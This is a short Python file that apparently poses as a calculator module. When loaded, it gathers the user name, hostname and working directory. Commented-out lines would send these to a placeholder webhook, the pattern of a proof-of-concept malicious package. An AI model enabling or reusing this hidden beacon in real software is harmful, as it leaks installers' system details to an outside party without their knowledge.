import os,requests,getpass,socket

def add(x, y):
        user = os.getenv('USER')
        host = os.getenv('HOSTNAME')
        print(user, host)
        return x+y


def calculator():
        hostname=socket.gethostname()
        cwd = os.getcwd()
        #username = getpass.getuser()
        #ploads = {'hostname':hostname,'cwd':cwd,'username':username}
        #requests.get("<WEBHOOK>",params = ploads)
        user = os.getenv('USER')
        host = os.getenv('HOSTNAME')
        print(user, host)

calculator()
